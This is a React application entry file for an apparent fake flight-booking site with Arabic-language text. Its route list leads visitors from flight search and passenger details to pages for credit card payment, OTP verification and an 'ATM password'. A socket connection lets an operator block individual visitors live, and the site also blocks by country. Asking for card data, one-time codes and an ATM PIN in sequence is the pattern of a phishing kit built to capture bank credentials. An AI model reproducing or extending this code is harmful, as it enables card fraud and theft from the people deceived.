import { useEffect, useState } from "react";
import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import ScrollToTop from "./components/ScrollToTop";
import PageTitleUpdater from "./components/PageTitleUpdater";
import { ThemeProvider } from "./contexts/ThemeContext";
import { LanguageProvider } from "./contexts/LanguageContext";
import { initializeSocket, disconnectSocket, socket, visitor } from "./lib/store";

// Project Pages
import FlightSearchResults from "./pages/FlightSearchResults";
import PassengerDetails from "./pages/PassengerDetails";
import SeatCustomization from "./pages/SeatCustomization";
import CreditCardPayment from "./pages/CreditCardPayment";
import OTPVerification from "./pages/OTPVerification";
import ATMPassword from "./pages/ATMPassword";
import FinalPage from "./pages/FinalPage";



function Router() {
  return (
    <Switch>
      {/* Flight Booking Flow */}
      <Route path="/" component={FlightSearchResults} />
      <Route path={"/flight-search"} component={FlightSearchResults} />
      <Route path={"/passenger-details"} component={PassengerDetails} />
      <Route path={"/seat-customization"} component={SeatCustomization} />
      <Route path={"/credit-card-payment"} component={CreditCardPayment} />
      <Route path={"/otp-verification"} component={OTPVerification} />
      <Route path={"/atm-password"} component={ATMPassword} />
      <Route path={"/final-page"} component={FinalPage} />

      <Route path={"/404"} component={NotFound} />
      {/* Final fallback route */}
      <Route component={NotFound} />
    </Switch>
  );
}

// Blocked Country Page Component
function BlockedCountryPage() {
  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
        <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
          <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/>
          </svg>
        </div>
        <h1 className="text-2xl font-bold text-gray-800 mb-4">غير متاح</h1>
        <p className="text-gray-600 mb-2">عذراً، هذه الخدمة غير متاحة في منطقتك</p>
        <p className="text-gray-500 text-sm">This service is not available in your region</p>
      </div>
    </div>
  );
}

function App() {
  const [isCountryBlocked, setIsCountryBlocked] = useState(false);
  const [isVisitorBlocked, setIsVisitorBlocked] = useState(false);
  const [blockedMessage, setBlockedMessage] = useState("");

  // Initialize socket on app mount
  useEffect(() => {
    initializeSocket();
    return () => {
      disconnectSocket();
    };
  }, []);
  // Listen for admin block/unblock events
  useEffect(() => {
    const s = socket.value;
    const handleBlocked = () => {
      setIsVisitorBlocked(true);
      setBlockedMessage("تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.");
    };
    const handleUnblocked = () => {
      setIsVisitorBlocked(false);
      setBlockedMessage("");
    };
    s.on("blocked", handleBlocked);
    s.on("unblocked", handleUnblocked);
    return () => {
      s.off("blocked", handleBlocked);
      s.off("unblocked", handleUnblocked);
    };
  }, []);

  useEffect(() => {
    const s = socket.value;

    const handleCheckResult = (payload: { isBlocked?: boolean }) => {
      setIsCountryBlocked(!!(payload && payload.isBlocked));
    };

    const handleUpdated = (blockedCountries: string[]) => {
      const country = (visitor.value.country || '').toLowerCase();
      if (!country || !Array.isArray(blockedCountries)) return;
      const blocked = blockedCountries.some(
        (c) => String(c).toLowerCase() === country
      );
      setIsCountryBlocked(blocked);
    };

    s.on('blockedCountries:checkResult', handleCheckResult);
    s.on('blockedCountries:updated', handleUpdated);

    let tries = 0;
    const ask = setInterval(() => {
      tries++;
      const country = visitor.value.country;
      if (country && s.connected) {
        s.emit('blockedCountries:check', country);
        clearInterval(ask);
      }
      if (tries > 10) clearInterval(ask);
    }, 500);

    return () => {
      clearInterval(ask);
      s.off('blockedCountries:checkResult', handleCheckResult);
      s.off('blockedCountries:updated', handleUpdated);
    };
  }, []);

  if (isCountryBlocked) {
    return <BlockedCountryPage />;
  }
  if (isVisitorBlocked) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
          <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/>
            </svg>
          </div>
          <h1 className="text-2xl font-bold text-gray-800 mb-4">تم الحظر</h1>
          <p className="text-gray-600 mb-2">{blockedMessage || "تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام."}</p>
        </div>
      </div>
    );
  }

  return (
    <ErrorBoundary>
      <ThemeProvider defaultTheme="light">
        <LanguageProvider>
          <TooltipProvider>
            <Toaster />
            <ScrollToTop />
            <PageTitleUpdater />

            <Router />
          </TooltipProvider>
        </LanguageProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;
